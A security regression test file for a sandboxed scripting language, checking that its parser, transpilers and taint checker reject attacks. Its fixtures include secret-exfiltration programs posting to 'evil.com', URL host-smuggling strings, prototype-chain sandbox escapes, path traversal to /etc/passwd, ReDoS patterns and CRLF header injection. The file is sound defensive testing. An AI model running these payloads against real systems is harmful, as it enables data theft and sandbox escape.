import {
  assert,
  assertEquals,
  assertNotEquals,
  assertRejects,
  assertThrows,
} from "@std/assert";
import { z } from "zod/v4";
import {
  buildMultipartBody,
  builtinRegistry,
  builtinUnaryFields,
  checkSignatureAgainstPolicy,
  checkSignatureAgainstRelation,
  complexityMaxDegree,
  computeSignature,
  hashProgram,
  httpRequest,
  interpret,
  op,
  parse,
  randomBytes,
  resolveImports,
  tokenize,
  toPython,
  toTypescript,
} from "../mod.ts";
import type { ExecutionContext, OpEntry, Program, Signature } from "../mod.ts";
import { type Dag, isGenuineDag } from "../src/lang/graph.ts";
import { executeDag } from "../src/lang/graphExec.ts";
import {
  arrayJoin,
  base64urlEncode,
  stringRegex,
  stringReplace,
} from "../src/ops/pure.ts";

const parseProg = (src: string): Program =>
  parse(tokenize(src), builtinUnaryFields);

const noNetCtx: ExecutionContext = {
  fetch: () => Promise.reject(new Error("unexpected network call")),
};

const runTs = async (
  source: string,
  fnName: string,
  args: Record<string, unknown>,
  ctx: ExecutionContext = noNetCtx,
): Promise<unknown> => {
  const prog = parseProg(source);
  const ts = toTypescript(prog);
  const mod = await import(
    "data:application/typescript," +
      encodeURIComponent(`${ts}\nexport { ${fnName} };`)
  );
  return await mod[fnName](args, ctx);
};

const runPy = async (
  pyCode: string,
  runnerExpr: string,
): Promise<{ code: number; stdout: string; stderr: string }> => {
  const script =
    `${pyCode}\n\nimport asyncio as __a\nprint(__a.run(${runnerExpr}))\n`;
  const cmd = new Deno.Command("python3", {
    args: ["-c", script],
    stdout: "piped",
    stderr: "piped",
  });
  const out = await cmd.output();
  return {
    code: out.code,
    stdout: new TextDecoder().decode(out.stdout).trim(),
    stderr: new TextDecoder().decode(out.stderr).trim(),
  };
};

// ============================================================================
// 1. [CRITICAL-1] Parameter Reassignment Desynchronization
// ============================================================================

Deno.test("[CRITICAL-1] parser rejects parameter reassignment in function and lambda", () => {
  assertThrows(
    () =>
      parseProg(`
        exfil = (secret: string) => {
          secret = "harmless"
          return httpRequest({ host: "evil.com", method: "POST", path: "/leak", body: secret })
        }
      `),
    Error,
    "Cannot reassign parameter 'secret'",
  );

  assertThrows(
    () =>
      parseProg(`
        main = (xs: number[]) => {
          return map((x) => {
            x = 0
            return x
          }, xs)
        }
      `),
    Error,
    "Cannot reassign parameter 'x'",
  );

  assertThrows(
    () =>
      parseProg(`
        main = (secret: string, xs: number[]) => {
          return map((x) => {
            secret = "clean"
            return secret
          }, xs)
        }
      `),
    Error,
    "Cannot reassign outer variable 'secret'",
  );
});

Deno.test("[CRITICAL-1] raw AST parameter reassignment rejected in signature, interpreter, and transpilers", async () => {
  const craftedAst: Program = {
    imports: [],
    docs: [],
    functions: [
      {
        name: "main",
        params: [{
          name: "secret",
          type: { kind: "primitive", name: "string" },
        }],
        body: [
          {
            kind: "assignment",
            name: "secret",
            value: { kind: "string", value: "public" },
          },
        ],
        returnValue: { kind: "reference", name: "secret" },
        returnType: { kind: "primitive", name: "string" },
      },
    ],
  };

  assertThrows(
    () => computeSignature(craftedAst, "main"),
    Error,
    "Cannot reassign parameter 'secret'",
  );
  assertThrows(
    () => toTypescript(craftedAst, "main"),
    Error,
    "Cannot reassign parameter 'secret'",
  );
  assertThrows(
    () => toPython(craftedAst, "main"),
    Error,
    "Cannot reassign parameter 'secret'",
  );
  await assertRejects(
    () =>
      Promise.resolve().then(() =>
        interpret(craftedAst, "main", { secret: "REAL_SECRET" }, noNetCtx)
      ),
    Error,
    "Cannot reassign parameter 'secret'",
  );
});

// ============================================================================
// 2. [CRITICAL-2] httpRequest URL Authority & Host Smuggling
// ============================================================================

Deno.test("[CRITICAL-2] httpRequest rejects malformed hosts, empty hosts, and static host/url mismatch", () => {
  const badHosts = [
    "",
    "api.trusted.com@evil.com",
    "evil.com#api.trusted.com",
    "evil.com?api.trusted.com",
    "api.trusted.com/v1",
    "api.trusted.com\\evil.com",
    "api.trusted.com ",
    "api.trusted.com:99999",
  ];

  for (const h of badHosts) {
    assertThrows(() => httpRequest(h), Error);
    const prog = parseProg(
      `main = () => httpRequest({ host: ${JSON.stringify(h)}, path: "/" })`,
    );
    assertThrows(() => computeSignature(prog, "main"), Error);
  }

  // Static host vs url authority mismatch must fail during computeSignature
  const mismatchProg = parseProg(`
    main = () => httpRequest({
      host: "api.trusted.com",
      url: "https://evil.com/steal"
    })
  `);
  assertThrows(
    () => computeSignature(mismatchProg, "main"),
    Error,
    "does not match declared host",
  );

  // Bad protocol and embedded credentials in static url
  assertThrows(
    () =>
      computeSignature(
        parseProg(`main = () => httpRequest("file:///etc/passwd")`),
        "main",
      ),
    Error,
  );
  assertThrows(
    () =>
      computeSignature(
        parseProg(`main = () => httpRequest("https://user:pass@trusted.com/")`),
        "main",
      ),
    Error,
  );
});

Deno.test("[CRITICAL-2] httpRequest blocks runtime subdomain, path, protocol, port, and credential smuggling across interpreter, TS, and Python", async () => {
  const seenUrls: string[] = [];
  const spyCtx: ExecutionContext = {
    fetch: (input: string | URL | Request) => {
      seenUrls.push(String(input));
      return Promise.resolve(new Response("ok", { status: 200 }));
    },
  };

  const subdomainSrc = `
    main = (sub: string) => httpRequest({
      host: "trusted.com",
      subdomain: sub,
      path: "/ok"
    })
  `;
  const badSubdomains = [
    "trusted.com@evil.com#",
    "a/b",
    "a?b",
    "a:8080",
    "sub space",
  ];
  for (const sub of badSubdomains) {
    await assertRejects(
      () => interpret(parseProg(subdomainSrc), "main", { sub }, spyCtx),
      Error,
    );
    await assertRejects(
      () => runTs(subdomainSrc, "main", { sub }, spyCtx),
      Error,
    );
  }

  const pathSrc = `
    main = (p: string) => httpRequest({
      host: "trusted.com",
      path: p
    })
  `;
  const badPaths = [
    "@evil.com/steal",
    ".evil.com/steal",
    ":8080/steal",
    "//evil.com/steal",
    "/\\evil.com/steal",
    "relative-no-slash",
  ];
  for (const p of badPaths) {
    await assertRejects(
      () => interpret(parseProg(pathSrc), "main", { p }, spyCtx),
      Error,
    );
    await assertRejects(
      () => runTs(pathSrc, "main", { p }, spyCtx),
      Error,
    );
  }

  // Python _build_safe_http_url enforcement
  const pyCode = toPython(parseProg(pathSrc), "main");
  const pySubRes = await runPy(
    pyCode,
    `_op_http_request({"host": "trusted.com", "subdomain": "x@evil.com#", "path": "/"}, ExecutionContext())`,
  );
  assertNotEquals(pySubRes.code, 0);

  const pyPathRes = await runPy(
    pyCode,
    `_op_http_request({"host": "trusted.com", "path": "//evil.com/steal"}, ExecutionContext())`,
  );
  assertNotEquals(pyPathRes.code, 0);

  const pyUrlMismatch = await runPy(
    pyCode,
    `_op_http_request({"host": "trusted.com", "url": "https://evil.com/steal"}, ExecutionContext())`,
  );
  assertNotEquals(pyUrlMismatch.code, 0);

  assertEquals(seenUrls.length, 0);
});

// ============================================================================
// 3. [CRITICAL-3] Multi-Secret Policy Laundering
// ============================================================================

Deno.test("[CRITICAL-3] checkSignatureAgainstPolicy requires EVERY contributing secret to allow target host", () => {
  const prog = parseProg(`
    main = (githubToken: string, slackToken: string) => {
      combined = githubToken + ":" + slackToken
      return httpRequest({
        host: "hooks.slack.com",
        method: "POST",
        path: "/services/T00/B00",
        body: combined
      })
    }
  `);
  const sig = computeSignature(prog, "main");
  const paramToSecret = new Map([
    ["githubToken", "GITHUB_TOKEN"],
    ["slackToken", "SLACK_TOKEN"],
  ]);
  const hostsBySecret = new Map([
    ["GITHUB_TOKEN", new Set(["api.github.com"])],
    ["SLACK_TOKEN", new Set(["hooks.slack.com"])],
  ]);

  const violations = checkSignatureAgainstPolicy(
    sig,
    paramToSecret,
    hostsBySecret,
  );
  assertEquals(violations.length, 1);
  assertEquals(violations[0].kind, "hosts");
  if (violations[0].kind === "hosts") {
    assertEquals(violations[0].requested, new Set(["hooks.slack.com"]));
    assertEquals(violations[0].allowed, new Set(["api.github.com"]));
  }

  // When NEITHER secret allows evil.com, emit one violation per unauthorized secret
  const evilProg = parseProg(`
    main = (githubToken: string, slackToken: string) => {
      return httpRequest({
        host: "evil.com",
        method: "POST",
        path: "/steal",
        body: githubToken + slackToken
      })
    }
  `);
  const evilViolations = checkSignatureAgainstPolicy(
    computeSignature(evilProg, "main"),
    paramToSecret,
    hostsBySecret,
  );
  assertEquals(evilViolations.length, 2);
});

// ============================================================================
// 4. [CRITICAL-4] Forged Graph IR (Dag) & Call Target Desync
// ============================================================================

Deno.test("[CRITICAL-4] forged unbranded Dag objects rejected in apply, map, filter, reduce, and executeDag", async () => {
  const forgedDag = {
    label: "forged",
    params: [],
    returnType: null,
    nodes: [
      {
        kind: "op",
        label: "httpRequest",
        staticArgs: [
          { key: "host", value: "evil.com" },
          { key: "path", value: "/pwn" },
        ],
        args: [],
      },
    ],
    effects: [],
    output: 0,
  };

  assertEquals(isGenuineDag(forgedDag), false);

  await assertRejects(
    () => executeDag(forgedDag as unknown as Dag, {}, builtinRegistry),
    Error,
    "unbranded or forged Dag",
  );

  // Passing forged Dag via runtime parameter into apply / map / filter / reduce
  const mapProg = parseProg(`
    helper = (x: number) => x + 1
    main = (arr: number[]) => map(helper, arr)
  `);
  // Attempt to construct a forged Dag inside Safescript and invoke via local apply
  const inlineForgedProg = parseProg(`
    main = () => {
      fake = {
        label: "pwn",
        params: [],
        returnType: null,
        nodes: [{ kind: "literal", value: 1337 }],
        effects: [],
        output: 0
      }
      return fake()
    }
  `);
  assertThrows(() => computeSignature(inlineForgedProg, "main"), Error);
  await assertRejects(
    () => interpret(inlineForgedProg, "main", {}, noNetCtx),
    Error,
    "valid Dag",
  );
  assertEquals(await interpret(mapProg, "main", { arr: [1, 2] }, noNetCtx), [
    2,
    3,
  ]);
});

Deno.test("[CRITICAL-4] if_else local override assignments, reference overrides, nested overrides, and shadowing stay in sync", () => {
  // 1. if_else assigning different overrides to local `f` unions BOTH hosts
  const branchOverrideProg = parseProg(`
    evilNet = () => httpRequest({ host: "evil.com", path: "/" })
    benignNet = () => httpRequest({ host: "benign.com", path: "/" })
    inner = () => httpRequest({ host: "orig.com", path: "/" })
    runner = () => inner()
    main = (cond: boolean) => {
      if (cond) {
        f = override(runner, { inner: evilNet })
      } else {
        f = override(runner, { inner: benignNet })
      }
      return f()
    }
  `);
  const branchSig = computeSignature(branchOverrideProg, "main");
  assertEquals(branchSig.hosts, new Set(["evil.com", "benign.com"]));

  // 2. Dead-branch overwrite `f = evil; if (false) { f = benign }; f()` still catches `evil.com`
  const deadBranchProg = parseProg(`
    evilNet = () => httpRequest({ host: "evil.com", path: "/" })
    benignNet = () => 1
    inner = () => 0
    runner = () => inner()
    main = () => {
      f = override(runner, { inner: evilNet })
      if (false) {
        f = override(runner, { inner: benignNet })
      }
      return f()
    }
  `);
  const deadBranchSig = computeSignature(deadBranchProg, "main");
  assertEquals(deadBranchSig.hosts.has("evil.com"), true);

  // 3. Reference override inside map (`map(step, xs)` overridden with `{ step: evilStep }`)
  const refOverrideProg = parseProg(`
    step = (x: string) => x
    evilStep = (x: string) => httpRequest({ host: "evil.com", method: "POST", path: "/leak", body: x }).body
    pipeline = (xs: string[]) => map(step, xs)
    main = (secrets: string[]) => {
      rewritten = override(pipeline, { step: evilStep })
      return rewritten({ xs: secrets })
    }
  `);
  const refSig = computeSignature(refOverrideProg, "main");
  assertEquals(refSig.hosts, new Set(["evil.com"]));
  assertEquals(
    refSig.dataFlow.get("host:evil.com"),
    new Set(["param:secrets"]),
  );

  // 4. Nested override merges outer and inner replacements identically to graph.ts
  const nestedOverrideProg = parseProg(`
    opA = (x: string) => x
    opB = (x: string) => x
    evilA = (x: string) => httpRequest({ host: "evil-a.com", method: "POST", path: "/a", body: x }).body
    benignB = (x: string) => x
    leaf = (x: string) => opB(opA(x))
    mid = (x: string) => override(leaf, { opB: benignB })({ x })
    main = (secret: string) => override(mid, { opA: evilA })({ x: secret })
  `);
  const nestedSig = computeSignature(nestedOverrideProg, "main");
  assertEquals(nestedSig.hosts, new Set(["evil-a.com"]));
  assertEquals(
    nestedSig.dataFlow.get("host:evil-a.com"),
    new Set(["param:secret"]),
  );

  // 5. Shadowing top-level function with param or local is rejected
  assertThrows(
    () =>
      parseProg(`
        helper = (x: number) => x
        main = (helper: number) => helper
      `),
    Error,
    "cannot shadow function",
  );
  assertThrows(
    () =>
      parseProg(`
        helper = (x: number) => x
        main = () => {
          helper = 123
          return helper
        }
      `),
    Error,
    "cannot shadow function",
  );

  // 6. __arg0 key rejected in call/object literals
  assertThrows(
    () =>
      parseProg(`
        alt = (x: string) => x
        sink = (x: string) => x
        main = (s: string) => {
          f = override(sink, { sha256: alt })
          return f({ __arg0: s })
        }
      `),
    Error,
    "Reserved key '__arg0'",
  );
});

// ============================================================================
// 5. [CRITICAL-5] Cross-Tenant Concurrency Races
// ============================================================================

Deno.test("[CRITICAL-5] concurrent interpret() calls isolate both composeLookup and getContext() across interleaved awaits", async () => {
  const makeTenantProgram = (tenantMultiplier: number, host: string) =>
    parseProg(`
      helper = (n: number) => n * ${tenantMultiplier}
      main = (val: number) => {
        first = httpRequest({ host: "${host}", path: "/step1" })
        computed = helper(val)
        second = httpRequest({ host: "${host}", path: "/step2", method: "POST", body: \`\${first.body}:\${computed}\` })
        return second.body
      }
    `);

  const tenants = Array.from({ length: 16 }, (_, idx) => {
    const tenantId = `tenant-${idx}`;
    const host = `t${idx}.example.com`;
    const prog = makeTenantProgram(idx + 2, host);
    const seenByTenant: string[] = [];
    const ctx: ExecutionContext = {
      fetch: async (input: string | URL | Request, init?: RequestInit) => {
        const url = String(input);
        seenByTenant.push(url);
        // Jittered async suspension to force interleaved resumption across tenants
        await new Promise((r) => setTimeout(r, (idx % 5) * 3 + 1));
        if (url.endsWith("/step1")) {
          return new Response(tenantId, { status: 200 });
        }
        return new Response(`${tenantId}|${String(init?.body ?? "")}`, {
          status: 200,
        });
      },
    };
    return { idx, tenantId, host, prog, ctx, seenByTenant };
  });

  const results = await Promise.all(
    tenants.map((t) => interpret(t.prog, "main", { val: 10 }, t.ctx)),
  );

  tenants.forEach((t, i) => {
    const expectedComputed = 10 * (t.idx + 2);
    assertEquals(results[i], `${t.tenantId}|${t.tenantId}:${expectedComputed}`);
    assertEquals(t.seenByTenant, [
      `https://${t.host}/step1`,
      `https://${t.host}/step2`,
    ]);
  });
});

// ============================================================================
// 6. [CRITICAL-6] Transpiler Sandbox Escapes
// ============================================================================

Deno.test("[CRITICAL-6] unbound globals and reserved/underscore identifiers are rejected", () => {
  const escapeAttempts = [
    `main = () => globalThis`,
    `main = () => Deno`,
    `main = () => process`,
    `main = () => _ctx`,
    `main = () => _ops`,
    `main = () => _OPS`,
    `main = () => __builtins__`,
    `main = () => Object.constructor`,
    `main = (_ctx: string) => _ctx`,
    `main = () => { _ops = 1; return _ops }`,
    `_getField = (x: string) => x`,
  ];

  for (const src of escapeAttempts) {
    assertThrows(() => {
      const p = parseProg(src);
      toTypescript(p, "main");
    }, Error);
  }
});

Deno.test("[CRITICAL-6] prototype and constructor chain escapes blocked in interpreter, TypeScript, and Python", async () => {
  const protoChainSrcs = [
    `main = (x: string) => x.constructor`,
    `main = (x: { a: number }) => x.__proto__`,
    `main = (x: { a: number }) => x.prototype`,
    `main = (x: { a: number }, k: string) => x[k]`,
  ];

  for (const src of protoChainSrcs.slice(0, 3)) {
    await assertRejects(
      () => interpret(parseProg(src), "main", { x: { a: 1 } }, noNetCtx),
      Error,
      "Forbidden property access",
    );
    await assertRejects(
      () => runTs(src, "main", { x: { a: 1 } }),
      Error,
      "Forbidden property access",
    );
    const py = toPython(parseProg(src), "main");
    const pyRes = await runPy(py, `main(x={"a": 1}, _ctx=ExecutionContext())`);
    assertNotEquals(pyRes.code, 0);
  }

  // Dynamic computed index "con" + "structor"
  const dynSrc = protoChainSrcs[3];
  for (const badKey of ["constructor", "__proto__", "prototype"]) {
    await assertRejects(
      () =>
        interpret(
          parseProg(dynSrc),
          "main",
          { x: { a: 1 }, k: badKey },
          noNetCtx,
        ),
      Error,
      "Forbidden property access",
    );
    await assertRejects(
      () => runTs(dynSrc, "main", { x: { a: 1 }, k: badKey }),
      Error,
      "Forbidden property access",
    );
    const py = toPython(parseProg(dynSrc), "main");
    const pyRes = await runPy(
      py,
      `main(x={"a": 1}, k=${JSON.stringify(badKey)}, _ctx=ExecutionContext())`,
    );
    assertNotEquals(pyRes.code, 0);
  }

  // Inherited Object.prototype.toString must return undefined, never Function/method
  const inheritedSrc = `main = (x: { a: number }) => x.toString`;
  assertEquals(
    await interpret(parseProg(inheritedSrc), "main", { x: { a: 1 } }, noNetCtx),
    undefined,
  );
  assertEquals(await runTs(inheritedSrc, "main", { x: { a: 1 } }), undefined);
  const pyInh = toPython(parseProg(inheritedSrc), "main");
  const pyInhRes = await runPy(
    pyInh,
    `main(x={"a": 1}, _ctx=ExecutionContext())`,
  );
  assertEquals(pyInhRes.code, 0);
  assertEquals(pyInhRes.stdout, "None");

  // Python dunder access via dynamic key blocked
  const pyDunder = await runPy(
    toPython(parseProg(dynSrc), "main"),
    `main(x={"a": 1}, k="__class__", _ctx=ExecutionContext())`,
  );
  assertNotEquals(pyDunder.code, 0);
});

// ============================================================================
// 7. [HIGH-1] & [HIGH-2] Implicit-Flow & Op Taint Laundering
// ============================================================================

Deno.test("[HIGH-1] filter predicate and if_else condition implicit flows propagate taint to sinks", () => {
  const paramToSecret = new Map([["secret", "API_SECRET"]]);
  const hostsBySecret = new Map([["API_SECRET", new Set(["trusted.com"])]]);

  // 1. Secret leaked via filter predicate
  const filterLeak = parseProg(`
    main = (secret: string) => {
      candidates = ["a", "b", "c"]
      matched = filter((c) => c == secret, candidates)
      return httpRequest({ host: "evil.com", method: "POST", path: "/leak", body: matched.join(",") })
    }
  `);
  const filterSig = computeSignature(filterLeak, "main");
  assert(filterSig.dataFlow.get("host:evil.com")?.has("param:secret"));
  assertEquals(
    checkSignatureAgainstPolicy(filterSig, paramToSecret, hostsBySecret).length,
    1,
  );

  // 2. Secret leaked via if_else branch assignment
  const ifAssignLeak = parseProg(`
    main = (secret: string) => {
      bit = "0"
      if (secret == "hunter2") {
        bit = "1"
      }
      return httpRequest({ host: "evil.com", method: "POST", path: "/leak", body: bit })
    }
  `);
  const ifAssignSig = computeSignature(ifAssignLeak, "main");
  assert(ifAssignSig.dataFlow.get("host:evil.com")?.has("param:secret"));
  assertEquals(
    checkSignatureAgainstPolicy(ifAssignSig, paramToSecret, hostsBySecret)
      .length,
    1,
  );

  // 3. Secret leaked via side-effect call inside if branch with no secret argument
  const ifControlLeak = parseProg(`
    main = (secret: string) => {
      if (secret == "hunter2") {
        httpRequest({ host: "evil.com", path: "/guessed-right" })
      }
      return "done"
    }
  `);
  const ifControlSig = computeSignature(ifControlLeak, "main");
  assert(ifControlSig.dataFlow.get("host:evil.com")?.has("param:secret"));
  assertEquals(
    checkSignatureAgainstPolicy(ifControlSig, paramToSecret, hostsBySecret)
      .length,
    1,
  );
});

Deno.test("[HIGH-2] time, random, network, imported ops, and checkSignatureAgainstRelation preserve taint", async () => {
  // 1. Passing secret-derived length into randomBytes or custom time op preserves taint
  const timeEchoOp = op({
    input: z.object({ text: z.string() }),
    output: z.string(),
    tags: ["time"],
    resources: { memoryBytes: 0, runtimeMs: 0, diskBytes: 0 },
    run: ({ text }) => Promise.resolve(text),
  });
  const extRegistry: ReadonlyMap<string, OpEntry> = new Map([
    ...builtinRegistry,
    [
      "timeEcho",
      { staticFields: new Set(), unaryField: "text", create: () => timeEchoOp },
    ],
  ]);
  const extUnary = new Map([...builtinUnaryFields, ["timeEcho", "text"]]);

  const launderProg = parse(
    tokenize(`
      main = (secret: string) => {
        viaTime = timeEcho(secret)
        viaRand = randomBytes(len(secret)).bytes
        return httpRequest({ host: "evil.com", method: "POST", path: "/steal", body: viaTime + viaRand })
      }
    `),
    extUnary,
  );
  const launderSig = computeSignature(launderProg, "main", extRegistry);
  assert(launderSig.dataFlow.get("host:evil.com")?.has("param:secret"));

  // 2. Imported function with timestamp() does not erase caller secret taint
  const depSrc = `
    stampSecret = (token: string) => {
      t = timestamp()
      return \`\${token}:\${t.timestamp}\`
    }
  `;
  const depHash = await hashProgram(depSrc);
  const mainSrc = `
    import stampSecret from "dep.ss" perms { envReads: ["timestamp"] } hash "${depHash}"
    main = (secret: string) => {
      stamped = stampSecret({ token: secret })
      return httpRequest({ host: "evil.com", method: "POST", path: "/steal", body: stamped })
    }
  `;
  const mainProg = parseProg(mainSrc);
  const resolvedReg = await resolveImports(
    mainProg,
    () => Promise.resolve(depSrc),
  );
  const impSig = computeSignature(mainProg, "main", resolvedReg);
  assert(impSig.dataFlow.get("host:evil.com")?.has("param:secret"));

  // 3. checkSignatureAgainstRelation transitively resolves intermediate host:* edges
  const syntheticSig: Signature = {
    name: "relay",
    params: [],
    returnType: null,
    hosts: new Set(["relay.trusted.com", "evil.com"]),
    envReads: new Set(),
    dataFlow: new Map([
      ["host:relay.trusted.com", new Set(["owner:alice"])],
      ["host:evil.com", new Set(["host:relay.trusted.com"])],
    ]),
    sources: new Set(),
    memoryBytes: 0,
    runtimeMs: 0,
    diskBytes: 0,
    complexity: { terms: [] },
  };
  const relViolations = checkSignatureAgainstRelation(
    syntheticSig,
    (labels, sink) =>
      sink === "host:evil.com" ? !labels.has("owner:alice") : true,
  );
  assertEquals(relViolations.length, 1);
  assertEquals(relViolations[0].sink, "host:evil.com");
  assert(relViolations[0].labels.has("owner:alice"));
});

// ============================================================================
// 8. [HIGH-3] & [MEDIUM-3] Isolate DoS, ReDoS, & Resource Exhaustion
// ============================================================================

Deno.test("[HIGH-3] step budget, string length cap, randomBytes bounds, chunked base64, and ReDoS guard", async () => {
  // 1. Exponential string doubling `s = s + s` stopped by MAX_STRING_LENGTH
  const blowupLines = Array.from({ length: 26 }, () => "  s = s + s").join(
    "\n",
  );
  const blowupProg = parseProg(`
    main = () => {
      s = "abcdefghij"
${blowupLines}
      return s
    }
  `);
  await assertRejects(
    () => interpret(blowupProg, "main", {}, noNetCtx),
    Error,
    "maximum string length",
  );

  // 2. stringReplace and arrayJoin enforce MAX_STRING_LENGTH
  const megabyte = "a".repeat(1024 * 1024);
  await assertRejects(
    () =>
      stringReplace.run({
        haystack: "x".repeat(100),
        needle: "x",
        replacement: megabyte,
        all: true,
      }),
    Error,
    "maximum string length",
  );
  await assertRejects(
    () =>
      arrayJoin.run({
        array: Array.from({ length: 10 }, () => megabyte),
        delimiter: ",",
      }),
    Error,
    "maximum string length",
  );

  // 3. Step budget stops combinatorial map amplification
  const thirtyFive = Array.from({ length: 35 }, (_, i) => i).join(",");
  const stepBomb = parseProg(`
    main = () => {
      a = [${thirtyFive}]
      b = map((x) => map((y) => x + y, a), a)
      c = map((row) => map((z) => map((w) => w + 1, a), row), b)
      return c.length
    }
  `);
  await assertRejects(
    () => interpret(stepBomb, "main", {}, noNetCtx),
    Error,
    "step budget exceeded",
  );

  // 4. randomBytes caps length to integer [0, 65536] and handles 65536 without stack overflow
  await assertRejects(() => randomBytes.run({ length: -1 }), Error);
  await assertRejects(() => randomBytes.run({ length: 1.5 }), Error);
  await assertRejects(() => randomBytes.run({ length: 100_000 }), Error);
  const maxRand = await randomBytes.run({ length: 65_536 });
  assert(maxRand.bytes.length > 80_000);

  // Chunked base64urlEncode handles >200KB without Maximum call stack size exceeded
  const bigEncoded = await base64urlEncode.run({ text: "A".repeat(200_000) });
  assert(bigEncoded.encoded.length > 260_000);

  // 5. stringRegex blocks catastrophic backtracking & backreferences quickly
  const redosPatterns = [
    "(a+)+$",
    "(.*a){10}",
    "([a-z]+)*$",
    "(a|a)+$",
    "(a|ab)+$",
    "([a-z]+)\\1",
    "a".repeat(1001),
  ];
  for (const pattern of redosPatterns) {
    await assertRejects(
      () => stringRegex.run({ text: "a".repeat(50) + "!", pattern }),
      Error,
    );
  }

  // 6. Deep expression nesting rejected by parser
  const deepExpr = `main = () => ${"(".repeat(300)}1${")".repeat(300)}`;
  assertThrows(() => parseProg(deepExpr), Error, "Maximum nesting depth");

  // 7. Thenable object input cannot hang interpret() or transpiled TS
  const passThrough = parseProg(`main = (x) => x`);
  await assertRejects(
    () =>
      interpret(
        passThrough,
        "main",
        { x: { then: () => {} } },
        noNetCtx,
      ),
    Error,
    "Thenable",
  );
  assertThrows(
    () =>
      toTypescript(
        parseProg(`
          noop = (x: number) => x
          main = () => ({ then: noop })
        `),
        "main",
      ),
    Error,
  );
});

Deno.test("[MEDIUM-3] nested filter and nested reduce scale polynomial complexity degree", () => {
  const nestedFilterProg = parseProg(`
    keepPos = (x: number) => x > 0
    f1 = (r1: number[]) => filter(keepPos, r1)
    f2 = (r2: number[][]) => filter((r1) => f1(r1).length > 0, r2)
    f3 = (r3: number[][][]) => filter((r2) => f2(r2).length > 0, r3)
    main = (r4: number[][][][]) => filter((r3) => f3(r3).length > 0, r4)
  `);
  const filterSig = computeSignature(nestedFilterProg, "main");
  assertEquals(complexityMaxDegree(filterSig), 4);
  assertEquals(
    checkSignatureAgainstPolicy(filterSig, new Map(), new Map(), 3).length,
    1,
  );

  const nestedReduceProg = parseProg(`
    r1 = (a: number[]) => reduce((acc, x) => acc + x, 0, a)
    r2 = (a: number[][]) => reduce((acc, row) => acc + r1(row), 0, a)
    r3 = (a: number[][][]) => reduce((acc, mat) => acc + r2(mat), 0, a)
    main = (a: number[][][][]) => reduce((acc, cube) => acc + r3(cube), 0, a)
  `);
  const reduceSig = computeSignature(nestedReduceProg, "main");
  assertEquals(complexityMaxDegree(reduceSig), 4);
  assertEquals(
    checkSignatureAgainstPolicy(reduceSig, new Map(), new Map(), 3).length,
    1,
  );
});

// ============================================================================
// 9. [HIGH-4], [MEDIUM-1], [MEDIUM-2], [LOW-1]
// ============================================================================

Deno.test("[HIGH-4] __proto__ object literals never pollute prototype and == uses strict non-coercing equality", async () => {
  const protoLitProg = parseProg(`
    main = () => {
      obj = { "__proto__": { polluted: true }, safe: 42 }
      return obj.safe
    }
  `);
  assertEquals(await interpret(protoLitProg, "main", {}, noNetCtx), 42);
  assertEquals(
    await runTs(
      protoLitProg.functions[0]
        ? `main = () => { obj = { "__proto__": { polluted: true }, safe: 42 }; return obj.safe }`
        : "",
      "main",
      {},
    ),
    42,
  );
  assertEquals(
    ({} as Record<string, unknown>).polluted,
    undefined,
  );

  // Strict equality (no JS loose coercion `"0" == 0` or `false == 0`)
  const eqProg = parseProg(`
    main = (a, b) => ({ eq: a == b, neq: a != b })
  `);
  assertEquals(
    await interpret(eqProg, "main", { a: "0", b: 0 }, noNetCtx),
    { eq: false, neq: true },
  );
  assertEquals(
    await interpret(eqProg, "main", { a: "", b: false }, noNetCtx),
    { eq: false, neq: true },
  );
  assertEquals(
    await interpret(eqProg, "main", { a: null, b: undefined }, noNetCtx),
    { eq: true, neq: false },
  );
});

Deno.test("[MEDIUM-1] hashProgram prevents normalization collisions on crafted keys and types", async () => {
  const h1 = await hashProgram(
    `main = () => ({ a: "1,b:2" })`,
  );
  const h2 = await hashProgram(
    `main = () => ({ a: "1", b: "2" })`,
  );
  assertNotEquals(h1, h2);

  const h3 = await hashProgram(
    `main = () => ({ a: 1, b: 2 })`,
  );
  const h4 = await hashProgram(
    `main = () => ({ "a:1,b": 2 })`,
  );
  assertNotEquals(h3, h4);
});

Deno.test("[MEDIUM-2] interpret() blocks implicit filesystem traversal and resolveImports requires hash", async () => {
  const traversalProg = parseProg(`
    import { pwn } from "./../../../../etc/passwd"
    main = () => pwn()
  `);
  await assertRejects(
    () =>
      Promise.resolve().then(() =>
        interpret(
          traversalProg,
          "main",
          {},
          noNetCtx,
          builtinRegistry,
          "/app/scripts/entry.ss",
        )
      ),
    Error,
    "Unresolved import",
  );

  await assertRejects(
    () => resolveImports(traversalProg, () => Promise.resolve("")),
    Error,
    "missing a required content hash",
  );
});

Deno.test("[LOW-1] buildMultipartBody strips CRLF and double quotes from header parameters", async () => {
  const res = await buildMultipartBody.run({
    fields: {
      'field"\r\nX-Injected: pwned': "val",
    },
    files: [
      {
        name: 'up"\r\nEvil: 1',
        filename: 'evil.txt"\r\nContent-Type: text/html\r\n\r\n<script>',
        content: "body",
        contentType: "text/plain\r\nX-Extra: bad",
      },
    ],
  });

  assertEquals(res.body.includes("X-Injected: pwned\r\n"), false);
  assert(res.body.includes('name="fieldX-Injected: pwned"'));
  assert(
    res.body.includes(
      'name="upEvil: 1"; filename="evil.txtContent-Type: text/html<script>"',
    ),
  );
  assert(res.body.includes("Content-Type: text/plainX-Extra: bad\r\n\r\nbody"));
});
